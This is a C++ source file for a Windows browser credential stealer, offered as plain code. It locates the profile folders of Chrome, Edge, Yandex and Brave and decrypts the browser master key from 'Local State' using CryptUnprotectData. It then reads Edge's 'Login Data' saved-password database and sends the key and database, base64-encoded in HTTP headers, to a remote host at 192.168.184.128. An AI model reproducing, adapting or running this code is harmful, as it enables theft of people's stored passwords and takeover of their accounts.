#include <iostream>
#include<cstdlib>
#include<string>
#include<map>
#include<fstream>
#include<sstream>
#include<nlohmann/json.hpp>
#include <windows.h>
#include <wincrypt.h>
#include<cpr/cpr.h>


#include "base64.hpp"

using namespace std;
#pragma warning(disable : 4996)
using json = nlohmann::json;


void send(const string& key, const string& db ) {
    cpr::Response test = cpr::Get(cpr::Url{ "http://192.168.184.128/tyext" },
        cpr::Header{{"\n\ncontent", db}},
        cpr::Header{ {"key",key}, }
        );
    cout << test.status_code;
}

string uprotectkey(const std::string& key) {
    DATA_BLOB encryptedBlob;
    DATA_BLOB plaintextBlob;
    LPWSTR pDescrOut = NULL;
    std::string plaintext;

    encryptedBlob.pbData = reinterpret_cast<BYTE*>(const_cast<char*>(key.data()));
    encryptedBlob.cbData = static_cast<DWORD>(key.size());

    BOOL success = CryptUnprotectData(
        &encryptedBlob,     
        &pDescrOut,         
        NULL,               
        NULL,               
        NULL,               
        0,                  
        &plaintextBlob      
    );

    if (success) {

        plaintext.assign(reinterpret_cast<char*>(plaintextBlob.pbData), plaintextBlob.cbData);
        LocalFree(plaintextBlob.pbData);

        if (pDescrOut) {
            LocalFree(pDescrOut);
        }
    }

    return plaintext;
}

string masterkey(const string& path) {
    string full_path = path + "\\Local State";
    fstream keyfile;
    keyfile.open(full_path, fstream::in); 
    json data = json::parse(keyfile);
    string decoded64key = base64::from_base64(data["os_crypt"]["encrypted_key"]).substr(5);
    keyfile.close();
    return uprotectkey(decoded64key);
}

int main()
{
	string appdata = getenv("LOCALAPPDATA");
    map<string, string> browsers = {

        {"google-chrome-sxs", string(appdata) + "\\Google\\Chrome SxS\\User Data"},
        {"google-chrome", string(appdata) + "\\Google\\Chrome\\User Data"},
        {"microsoft-edge", string(appdata) + "\\Microsoft\\Edge\\User Data"},
        {"yandex", string(appdata) + "\\Yandex\\YandexBrowser\\User Data"},
        {"brave", string(appdata) + "\\BraveSoftware\\Brave-Browser\\User Data"},
        // not yet{"opera-gx", string(appdata)+ "\\Roaming\\Opera Software\\Opera GX Stable"}
    };
    
    string key = masterkey(browsers.at("microsoft-edge"));
    string dbpath = browsers.at("microsoft-edge") + "\\Default\\Login Data";
    ostringstream contentStream;
    ifstream db(dbpath, std::ios::binary);
    contentStream << db.rdbuf();
    string content = contentStream.str();
    send(base64::to_base64(key), base64::to_base64(content));
    return 0;
}